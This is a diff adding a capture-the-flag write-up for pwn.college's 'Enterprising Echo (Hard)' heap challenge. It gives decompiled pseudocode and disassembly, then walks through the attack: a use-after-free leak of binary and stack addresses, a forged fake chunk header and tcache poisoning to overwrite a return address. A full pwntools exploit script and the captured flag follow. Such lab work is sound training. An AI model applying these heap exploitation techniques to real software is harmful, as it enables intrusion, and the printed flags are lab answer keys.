@@ -7376,3 +7376,323 @@ hacker@dynamic-allocator-misuse~enterprising-echo-easy:/$ python ~/script.py
 You win! Here is your flag:
 pwn.college{cLzcd_6TOaMPcuAj43NM-8jtBDS.01N5MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Enterprising Echo (Hard)
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-hard:/$ /challenge/enterprising-echo-hard
+###
+### Welcome to /challenge/enterprising-echo-hard!
+###
+
+
+[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/enterprising-echo-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  unsigned int v5; // [rsp+2Ch] [rbp-1A4h]
+  unsigned int v6; // [rsp+2Ch] [rbp-1A4h]
+  unsigned int v7; // [rsp+2Ch] [rbp-1A4h]
+  unsigned int v8; // [rsp+2Ch] [rbp-1A4h]
+  unsigned int v9; // [rsp+30h] [rbp-1A0h]
+  unsigned int size; // [rsp+34h] [rbp-19Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
+  char s1[128]; // [rsp+C0h] [rbp-110h] BYREF
+  _BYTE v13[64]; // [rsp+140h] [rbp-90h] BYREF
+  _QWORD v14[10]; // [rsp+180h] [rbp-50h] BYREF
+  v14[9] = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              puts(byte_2138);
+              printf("[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_2138);
+              if ( strcmp(s1, "malloc") )
+                break;
+              printf("Index: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_2138);
+              v5 = atoi(s1);
+              if ( v5 > 0xF )
+                __assert_fail("allocation_index < 16", "<stdin>", 0x70u, "main");
+              printf("Size: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_2138);
+              size = atoi(s1);
+              ptr[v5] = malloc(size);
+            }
+            if ( strcmp(s1, "free") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_2138);
+            v6 = atoi(s1);
+            if ( v6 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x80u, "main");
+            free(ptr[v6]);
+          }
+          if ( strcmp(s1, "echo") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2138);
+          v7 = atoi(s1);
+          if ( v7 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x8Cu, "main");
+          printf("Offset: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2138);
+          v9 = atoi(s1);
+          echo(ptr[v7], v9);
+        }
+        if ( strcmp(s1, "scanf") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_2138);
+        v8 = atoi(s1);
+        if ( v8 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x9Cu, "main");
+        v3 = malloc_usable_size(ptr[v8]);
+        sprintf(s1, "%%%us", v3);
+        __isoc99_scanf(s1, ptr[v8]);
+        puts(byte_2138);
+      }
+      if ( strcmp(s1, "stack_free") )
+        break;
+      free(v14);
+    }
+    if ( strcmp(s1, "stack_scanf") )
+      break;
+    __isoc99_scanf("%127s", v13);
+    puts(byte_2138);
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+The hard version prints nothing at all. No allocation addresses, no `stack_free` address, no tcache display. The goal is the same as the easy version, overwriting `main`'s return address with `win()`, but we have to obtain both the binary base and the stack address entirely through the echo and tcache mechanisms.
+
+### Finding win
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-hard:/$ nm /challenge/enterprising-echo-hard | grep -E "main|win"
+                 U __libc_start_main@@GLIBC_2.2.5
+00000000000015a9 T main
+0000000000001409 T win
+
+hacker@dynamic-allocator-misuse~enterprising-echo-hard:/$ python3 -c "
+data = open('/challenge/enterprising-echo-hard', 'rb').read()
+print(hex(data.find(b'/bin/echo')))
+"
+0x2110
+```
+
+So `base = bin_leak - 0x2110`. However `win` is at offset `0x1409`, whose lowest byte is `0x09`, a tab character. Since `scanf` stops at whitespace, we can never write `win_addr` directly. Checking the disassembly of `win`:
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-hard:/$ objdump -d /challenge/enterprising-echo-hard | grep -A 20 "<win>"
+0000000000001409 <win>:
+    1409:       f3 0f 1e fa             endbr64
+    140d:       55                      push   %rbp
+    140e:       48 89 e5                mov    %rsp,%rbp
+    1411:       48 8d 3d f0 0b 00 00    lea    0xbf0(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
+    1418:       e8 c3 fd ff ff          call   11e0 <puts@plt>
+    141d:       be 00 00 00 00          mov    $0x0,%esi
+    1422:       48 8d 3d fb 0b 00 00    lea    0xbfb(%rip),%rdi        # 2024 <_IO_stdin_used+0x24>
+    1429:       b8 00 00 00 00          mov    $0x0,%eax
+    142e:       e8 6d fe ff ff          call   12a0 <open@plt>
+    1433:       89 05 07 2c 00 00       mov    %eax,0x2c07(%rip)        # 4040 <flag_fd.5679>
+    1439:       8b 05 01 2c 00 00       mov    0x2c01(%rip),%eax        # 4040 <flag_fd.5679>
+    143f:       85 c0                   test   %eax,%eax
+    1441:       79 49                   jns    148c <win+0x83>
+    1443:       e8 88 fd ff ff          call   11d0 <__errno_location@plt>
+    1448:       8b 00                   mov    (%rax),%eax
+    144a:       89 c7                   mov    %eax,%edi
+    144c:       e8 9f fe ff ff          call   12f0 <strerror@plt>
+    1451:       48 89 c6                mov    %rax,%rsi
+    1454:       48 8d 3d d5 0b 00 00    lea    0xbd5(%rip),%rdi        # 2030 <_IO_stdin_used+0x30>
+    145b:       b8 00 00 00 00          mov    $0x0,%eax
+```
+
+`win+5 = 0x140e` is `mov %rsp,%rbp`, the third instruction. Jumping here skips `endbr64` and `push %rbp` but lands cleanly inside the function, sets up the frame, and continues normally to open and print the flag. `0x140e`'s lowest byte is `0x0e`, which is not whitespace. So we use `win_addr = base + 0x140e`.
+
+### Binary Leak via Echo's Internal Chunk
+
+Same as the easy version. `argv[1]` points to a rodata string rather than a stack variable, so only offset 0 gives a useful binary leak:
+
+```
+base = bin_leak - 0x2110
+```
+
+### Stack Leak via Echo's argv[2]
+
+Since `stack_free` prints nothing, we need another way to get `v14`'s address. The key insight is that when `echo(idx, offset)` runs, it writes `argv[2] = ptr[idx] + offset` into its internal `malloc(0x20)` chunk at offset `0x10`. If we arrange for that chunk to be a chunk we control, we can read `ptr[idx] + offset` back via echo.
+
+The sequence is:
+
+1. `stack_free` puts `v14` into the tcache. `malloc(2, 128)` pops `v14` into `ptr[2]`.
+2. We `malloc(3, 32)` and `free(3)` to put a 32-byte chunk into the tcache.
+3. We call `echo(2, 0)`. Echo's internal `malloc(0x20)` pops `ptr[3]`'s chunk and writes `argv[2] = ptr[2] + 0 = v14_addr` into it at offset `0x10`.
+4. `ptr[3]` is still a dangling pointer to that chunk. We call `echo(3, 0x10)` to read `v14_addr` back out.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  echo's internal argv chunk (was ptr[3])              ┆
+├───────────────────────────────────────────────────────┤
+│  +0x00: argv[0] = &"/bin/echo"  <- binary address     │
+├───────────────────────────────────────────────────────┤
+│  +0x08: argv[1] = &"Data: "     <- binary address     │
+├───────────────────────────────────────────────────────┤
+│  +0x10: argv[2] = ptr[2] + 0    <- v14_addr (stack)   │
+├───────────────────────────────────────────────────────┤
+│  +0x18: argv[3] = NULL                                │
+└───────────────────────────────────────────────────────┘
+```
+
+### Forging the Fake Chunk Header
+
+`stack_free` aborts without a valid size field at `v14-0x8`. `v13` is at `[rbp-0x90]` and `v14-0x8` is at `[rbp-0x58]`, which is 56 bytes into `v13`. We write 56 bytes of padding followed by `p64(0x91)` (144 bytes with PREV_INUSE set, matching `malloc(128)`).
+
+### Tcache Poisoning to Overwrite the Return Address
+
+With `v14_addr` known, `ret_addr = v14_addr + 0x58`. After `malloc(2, 128)` has already popped `v14` (count=0), we free two fresh heap chunks making count=2. We poison the first chunk's `next` to `ret_addr`. Then:
+
+- `malloc(4)` pops first chunk, count=1, head=`ret_addr`
+- `malloc(5)` pops `ret_addr`, count=0
+- `scanf(5, p64(win_addr))` writes `win_addr` to the return address
+- `quit` triggers the return, jumping to `win+5`
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/enterprising-echo-hard")
+
+p.recvuntil(b"quit): ")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def echo_raw(idx, offset):
+    p.sendline(b"echo")
+    p.sendline(str(idx).encode())
+    p.sendline(str(offset).encode())
+    p.recvuntil(b"Data: ")
+    data = p.recvuntil(b"\n", drop=True)
+    p.recvuntil(b"quit): ")
+    return data
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+# binary leak via echo chunk reuse
+malloc(0, 32)
+free(0)
+echo_raw(0, 0)
+bin_leak = echo_raw(0, 0).ljust(8, b"\x00")[:8]
+bin_addr = u64(bin_leak)
+base     = bin_addr - 0x2110
+win_addr = base + 0x140e  # win+5: skips endbr64 and push rbp, lowest byte 0x0e
+print(f"[*] base:     {hex(base)}")
+print(f"[*] win_addr: {hex(win_addr)}")
+
+# forge fake chunk header at v14-0x8 (56 bytes into v13)
+p.sendline(b"stack_scanf")
+p.sendline(b"A" * 56 + p64(0x91))
+p.recvuntil(b"quit): ")
+
+# stack_free puts v14 into tcache (count=1)
+p.sendline(b"stack_free")
+p.recvuntil(b"quit): ")
+
+# pop v14 into ptr[2] (count=0)
+malloc(2, 128)
+
+# free a 32-byte chunk so echo's internal malloc reuses it
+malloc(3, 32)
+free(3)
+
+# echo(2, 0) writes v14_addr into ptr[3]'s chunk at offset 0x10
+echo_raw(2, 0)
+
+# read v14_addr from ptr[3]+0x10
+raw = echo_raw(3, 0x10).ljust(8, b"\x00")[:8]
+v14_addr = u64(raw)
+ret_addr = v14_addr + 0x58
+print(f"[*] v14_addr: {hex(v14_addr)}")
+print(f"[*] ret_addr: {hex(ret_addr)}")
+
+# free two fresh heap chunks: count=2, head=a->b
+malloc(4, 128)
+malloc(5, 128)
+free(5)
+free(4)
+
+# poison a's next to ret_addr: count=2, head=a->ret_addr
+scanf(4, p64(ret_addr))
+
+# malloc(4) pops a, count=1, head=ret_addr
+malloc(4, 128)
+# malloc(5) pops ret_addr, count=0
+malloc(5, 128)
+# write win_addr to ret_addr
+scanf(5, p64(win_addr))
+
+p.sendline(b"quit")
+print(p.recvall().decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~enterprising-echo-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/enterprising-echo-hard': pid 16534
+[*] base:     0x59c8ab636000
+[*] win_addr: 0x59c8ab63740e
+[*] v14_addr: 0x7ffe5376d4a0
+[*] ret_addr: 0x7ffe5376d4f8
+[+] Receiving all data: Done (101B)
+[*] Process '/challenge/enterprising-echo-hard' stopped with exit code -11 (SIGSEGV) (pid 16534)
+
+### Goodbye!
+You win! Here is your flag:
+pwn.college{8M3Ds1iDvEKZurbW5f_Y2GpApfy.0FO5MDL4ITM0EzW}
+```
